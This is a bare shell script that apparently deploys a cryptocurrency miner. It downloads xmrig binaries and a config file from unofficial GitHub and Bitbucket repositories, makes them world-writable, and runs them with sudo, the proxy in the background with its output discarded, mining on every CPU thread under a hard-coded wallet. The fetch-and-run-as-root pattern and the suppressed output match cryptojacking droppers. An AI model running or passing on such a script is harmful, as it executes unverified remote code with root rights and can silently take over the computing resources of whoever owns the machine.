apt update
apt install sudo -y
wget https://bitbucket.org/fearstone/xdag/raw/5b7e4d59385fb3119fdaed5d968f02530beda1d2/config.json
wget https://raw.githubusercontent.com/jsiqiisn/xdag/main/xmrig2xdag
wget https://raw.githubusercontent.com/jsiqiisn/xdag/main/xmrig
chmod 777 xmrig xmrig2xdag config.json
sudo ./xmrig2xdag -c config.json > /dev/null 2>&1 &
sudo ./xmrig -o 127.0.0.1:3232. -u A7F3atzGYPEBYAZlTZTfy4bKr8y3Ho57 -p x -a rx/xdag -t$(nproc --all)
